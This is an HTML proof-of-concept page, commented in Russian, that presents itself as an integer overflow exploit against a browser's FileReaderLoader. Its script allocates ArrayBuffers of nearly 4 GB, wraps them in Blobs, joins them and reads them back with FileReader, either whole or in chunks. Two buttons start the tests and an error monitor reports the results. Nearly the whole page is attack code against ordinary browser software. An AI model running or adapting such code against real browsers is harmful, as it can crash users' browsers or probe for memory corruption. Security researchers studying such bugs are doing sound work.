<!DOCTYPE html>
<html>
<head>
    <title>Integer Overflow PoC - FileReaderLoader</title>
    <script>
        async function createExploitFile() {
            // Создаем файл, который вызовет переполнение
            
            // Первая часть: почти максимальный размер unsigned int
            const part1Size = 0xFFFFFFFF - 100; // 4294967195 байт
            const part2Size = 200; // Дополнительные данные
            
            // Создаем ArrayBuffer для первой части
            const part1Buffer = new ArrayBuffer(part1Size);
            const part1View = new Uint8Array(part1Buffer);
            // Заполняем данными
            for (let i = 0; i < Math.min(part1Size, 10000); i++) {
                part1View[i] = i % 256;
            }
            
            // Создаем Blob
            const blob = new Blob([part1Buffer], { type: 'application/octet-stream' });
            
            // Читаем через FileReader
            const reader = new FileReader();
            
            reader.onload = function(e) {
                console.log("Файл загружен, размер:", e.target.result.byteLength);
                
                // Теперь добавляем вторую часть
                const additionalBlob = new Blob([new ArrayBuffer(part2Size)]);
                const combinedBlob = new Blob([blob, additionalBlob]);
                
                const reader2 = new FileReader();
                reader2.onload = function(e2) {
                    console.log("Комбинированный файл загружен");
                };
                reader2.onerror = function(e2) {
                    console.error("Ошибка при чтении комбинированного файла:", e2);
                };
                reader2.readAsArrayBuffer(combinedBlob);
            };
            
            reader.onerror = function(e) {
                console.error("Ошибка при чтении файла:", e);
            };
            
            reader.onprogress = function(e) {
                if (e.lengthComputable) {
                    console.log("Прогресс:", (e.loaded / e.total * 100).toFixed(2) + "%");
                }
            };
            
            reader.readAsArrayBuffer(blob);
        }
        
        // Альтернативный подход: использовать slice для инкрементального чтения
        function testIncrementalRead() {
            const size1 = 0xFFFFFF00; // 4294967040 байт
            const size2 = 0x00000100; // 256 байт
            
            const buffer1 = new ArrayBuffer(size1);
            const buffer2 = new ArrayBuffer(size2);
            
            const blob1 = new Blob([buffer1]);
            const blob2 = new Blob([buffer2]);
            const combinedBlob = new Blob([blob1, blob2]);
            
            const reader = new FileReader();
            let chunkCount = 0;
            
            // Читаем по частям
            function readChunk(start, end) {
                const slice = combinedBlob.slice(start, end);
                const chunkReader = new FileReader();
                
                chunkReader.onload = function(e) {
                    console.log(`Чанк ${chunkCount++} загружен: ${e.target.result.byteLength} байт`);
                    
                    // Читаем следующий чанк
                    if (end < combinedBlob.size) {
                        const nextStart = end;
                        const nextEnd = Math.min(end + size2, combinedBlob.size);
                        setTimeout(() => readChunk(nextStart, nextEnd), 100);
                    }
                };
                
                chunkReader.onerror = function(e) {
                    console.error(`Ошибка в чанке ${chunkCount}:`, e);
                };
                
                chunkReader.readAsArrayBuffer(slice);
            }
            
            // Начинаем чтение
            readChunk(0, Math.min(size2, combinedBlob.size));
        }
    </script>
</head>
<body>
    <h1>PoC: Integer Overflow в FileReaderLoader</h1>
    <button onclick="createExploitFile()">Тест 1: Создать exploit файл</button>
    <button onclick="testIncrementalRead()">Тест 2: Инкрементальное чтение</button>
    
    <div id="status" style="margin-top: 20px; padding: 10px; background: #f0f0f0;"></div>
    
    <script>
        // Мониторинг ошибок
        window.addEventListener('error', function(e) {
            document.getElementById('status').innerHTML = 
                `<strong>Ошибка:</strong> ${e.message}<br>` +
                `<strong>Файл:</strong> ${e.filename}:${e.lineno}`;
            console.error("Global error:", e);
        });
    </script>
</body>
</html>
